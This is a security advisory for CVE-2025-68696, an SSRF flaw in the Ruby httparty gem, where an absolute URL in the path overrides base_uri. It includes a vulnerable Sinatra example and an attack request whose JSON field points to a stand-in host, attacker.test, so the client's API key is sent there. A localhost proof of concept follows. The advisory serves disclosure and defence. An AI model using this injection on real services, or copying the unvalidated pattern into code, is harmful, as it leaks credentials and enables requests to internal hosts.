# [H] httparty Has Potential SSRF Vulnerability That Leads to API Key Leakage

## Summary
Severity: High
Advisory: GHSA-hm5p-x4rq-38w4
CVE: CVE-2025-68696
CWE: CWE-918
Ecosystem: RubyGems
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2025-12-23
Source: https://github.com/advisories/GHSA-hm5p-x4rq-38w4
Type: github-advisory

## Affected
- RubyGems: `httparty` — affected >=0 <0.24.0

## Details
## Summary

There may be an SSRF vulnerability in httparty. This issue can pose a risk of leaking API keys, and it can also allow third parties to issue requests to internal servers.

## Details

When httparty receives a path argument that is an absolute URL, it ignores the `base_uri` field. As a result, if a malicious user can control the path value, the application may unintentionally communicate with a host that the programmer did not anticipate.

Consider the following example of a web application:

```rb
require 'sinatra'
require 'httparty'

class RepositoryClient
  include HTTParty
  base_uri 'http://exmaple.test/api/v1/repositories/'
  headers 'X-API-KEY' => '1234567890'
end

post '/issue' do
  request_body = JSON.parse(request.body.read)
  RepositoryClient.get(request_body['repository_id']).body
  # do something
  json message: 'OK'
end
```

Now, suppose an attacker sends a request like this:

```
POST /issue HTTP/1.1
Host: localhost:10000
Content-Type: application/json

{
    "repository_id": "http://attacker.test",
    "title": "test"
}
```

In this case, httparty sends the `X-API-KEY` not to `http://example.test` but instead to `http://attacker.test`.

A similar problem was reported and fixed in the HTTP client library axios in the past:  
<https://github.com/axios/axios/issues/6463>

Also, Python's `urljoin` function has documented a warning about similar behavior:  
<https://docs.python.org/3.13/library/urllib.parse.html#urllib.parse.urljoin>

## PoC

Follow these steps to reproduce the issue:

1. Set up two simple HTTP servers.

   ```bash
   mkdir /tmp/server1 /tmp/server2
   echo "this is server1" > /tmp/server1/index.html 
   echo "this is server2" > /tmp/server2/index.html
   python -m http.server -d /tmp/server1 10001 &
   python -m http.server -d /tmp/server2 10002 &
   ```

2. Create a script (for example, `main.rb`):

   ```rb
   require 'httparty'

   class Client
     include HTTParty
     base_uri 'http://localhost:10001'
   end

   data = Client.get('http://localhost:10002').body
   puts data
   ```

3. Run the script:

   ```bash
   $ ruby main.rb
   this is server2
   ```

Although `base_uri` is set to `http://localhost:10001/`, httparty sends the request to `http://localhost:10002/`.


## Impact

- Leakage of credentials: If an absolute URL is provided, any API keys or credentials configured in httparty may be exposed to unintended third-party hosts.  
- SSRF (Server-Side Request Forgery): Attackers can force the httparty-based program to send requests to other internal hosts within the network where the program is running.  
- Affected users: Any software that uses `base_uri` and does not properly validate the path parameter may be affected by this issue.

## References
- https://github.com/jnunemaker/httparty/security/advisories/GHSA-hm5p-x4rq-38w4
- https://nvd.nist.gov/vuln/detail/CVE-2025-68696
- https://github.com/jnunemaker/httparty/commit/0529bcd6309c9fd9bfdd50ae211843b10054c240
- https://github.com/jnunemaker/httparty
- https://github.com/rubysec/ruby-advisory-db/blob/master/gems/httparty/CVE-2025-68696.yml
